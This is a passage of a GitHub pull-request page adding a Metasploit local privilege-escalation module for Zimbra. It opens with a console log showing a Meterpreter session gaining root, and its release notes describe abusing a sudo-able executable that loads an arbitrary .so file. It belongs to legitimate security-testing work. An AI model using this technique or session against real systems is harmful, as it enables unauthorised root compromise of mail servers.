Transmitting intermediate stager...(126 bytes) [*] Sending stage (3020772 bytes) to 10.0.0.1 [+] Deleted /tmp/.ng58U2 [*] Meterpreter session 2 opened (10.0.0.1:4444 -> 10.0.0.1:58877) at 2022-08-09 18:03:06 +0200   meterpreter > meterpreter > sysinfo Computer     : mail.donotexistdomain.foo OS           : Ubuntu 18.04 (Linux 5.4.0-122-generic) Architecture : x64 BuildTuple   : x86_64-linux-musl Meterpreter  : x64/linux meterpreter > getuid Server username: root  ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&u=562c1b6600d722e45a20f2202dddeb2d6db1f091&v=4)](/bwatters-r7)
[bwatters-r7](/bwatters-r7)
merged commit [`a8e73d9`](/rapid7/metasploit-framework/commit/a8e73d9fa90471fa5ccf75c2a09ca27f6741e00c)
into
rapid7:master

[Aug 9, 2022](https://github.com/rapid7/metasploit-framework/pull/16807#event-7157020484)

[![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=80&u=562c1b6600d722e45a20f2202dddeb2d6db1f091&v=4)](/bwatters-r7)

Copy link

Contributor

### **[bwatters-r7](/bwatters-r7)** commented [Aug 9, 2022](#issuecomment-1209597227)

| Release Notes This PR adds a local exploit for Zimbra to go from the zimbra user to root by using a sudo-able executable that can load an arbitrary .so file. |
| --- |

All reactions

Sorry, something went wrong.

[![@jmartin-tech](https://avatars.githubusercontent.com/u/7873740?s=40&u=761d485098432a30044aa248045cd6d7573482c0&v=4)](/jmartin-tech)
[jmartin-tech](/jmartin-tech)
added
the
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules
label
[Aug 11, 2022](#event-7175333544)

[![@fevar54](https://avatars.githubusercontent.com/u/80516843?s=80&u=663edc5fb9c422ca3e98c440eea893015505a54a&v=4)](/fevar54)

Copy link

### **[fevar54](/fevar54)** commented [Aug 16, 2022](#issuecomment-1217223893)

| you have resulting indicators of compromise to your test... Thank you |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16807)

Reviewers

[![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&v=4)](/bwatters-r7) [bwatters-r7](/bwatters-r7)

bwatters-r7 left review comments

Assignees

[![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&v=4)](/bwatters-r7) [bwatters-r7](/bwatters-r7)

[![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=40&v=4)](/cdelafuente-r7) [cdelafuente-r7](/cdelafuente-r7)

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

7 participants

[![@rbowes-r7](https://avatars.githubusercontent.com/u/104588115?s=52&v=4)](/rbowes-r7) [![@h00die](https://avatars.githubusercontent.com/u/752491?s=52&v=4)](/h00die) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=52&v=4)](/bwatters-r7) [![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=52&v=4)](/cdelafuente-r7) [![@fevar54](https://avatars.githubusercontent.com/u/80516843?s=52&v=4)](/fevar54) [![@jmartin-tech](https://avatars.githubusercontent.com/u/7873740?s=52&v=4)](/jmartin-tech) [![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=52&v=4)](/gwillcox-r7)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


